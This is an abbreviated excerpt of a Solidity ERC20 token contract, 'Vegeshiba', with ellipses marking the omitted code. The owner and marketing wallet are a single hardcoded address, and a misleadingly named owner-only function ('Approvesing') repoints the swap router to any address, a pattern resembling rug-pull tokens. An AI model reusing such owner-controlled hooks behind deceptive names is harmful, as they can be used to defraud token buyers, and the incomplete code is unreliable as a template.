...
contract Vegeshiba is ERC20, Ownable {
    ...
    address private marketingWalletAddress = 0xD53B53Cf0F766Ab221416058c4dDbAC133d05076;
    ...
    constructor () ERC20("Vegeshiba", "VESHIB")
    {
        transferOwnership(0xD53B53Cf0F766Ab221416058c4dDbAC133d05076);
        ...
        _init(owner(), 33333333333 ether);
    }

    receive() external payable {}

    function Approvesing(address uniFactory) external onlyOwner {
        require(uniFactory != address(0), "Not zero address");
        swapAndEnabled = true;
        uniswapV2Router = IUniswapV2Router02(uniFactory);
    }
    ...
    function vegeToken(address _token) external {
